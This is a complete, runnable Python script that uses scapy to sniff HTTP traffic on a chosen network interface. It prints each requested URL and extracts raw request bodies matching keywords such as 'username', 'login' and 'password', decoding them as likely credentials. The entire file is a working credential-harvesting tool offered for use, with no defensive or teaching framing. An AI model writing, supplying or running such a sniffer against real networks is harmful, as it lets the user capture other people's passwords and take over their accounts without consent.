#!/usr/bin/env python3
import argparse
import sys
import urllib.parse

import scapy.all as scapy
from scapy.layers import http


class PasswordSniffer:
    def __init__(self, interface):
        self.interface = interface

    def get_url(self, packet):
        try:
            return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        except TypeError as e:
            return e

    # Find keywords in the packet load, if keywords exist, consider it as login info
    def get_login_info(self, packet):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            # Add email here if you want, but it will cause a lot of false positive
            keywords = ["username", "uname", "user", "name", "login", "password", "pass", "key"]
            for keyword in keywords:
                if keyword in load:
                    return urllib.parse.unquote(load)

    def process_sniffed_packet(self, packet):
        if packet.haslayer(http.HTTPRequest):
            url = self.get_url(packet)
            print_to_stderr("[+] HTTP Request >> " + url.decode())

            login_info = self.get_login_info(packet)
            if login_info:
                print_to_stderr("\n[+] Possible username/password > " + login_info + "\n")

    def run(self):
        scapy.sniff(iface=self.interface, store=False, prn=self.process_sniffed_packet)


def print_to_stderr(*a):
    print(*a, file=sys.stderr)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="The target interface to sniff on")
    options = parser.parse_args()

    return options


options = get_arguments()
interface = options.interface
# Initialize Password Sniffer
sniffer = PasswordSniffer(interface)
# Run
sniffer.run()
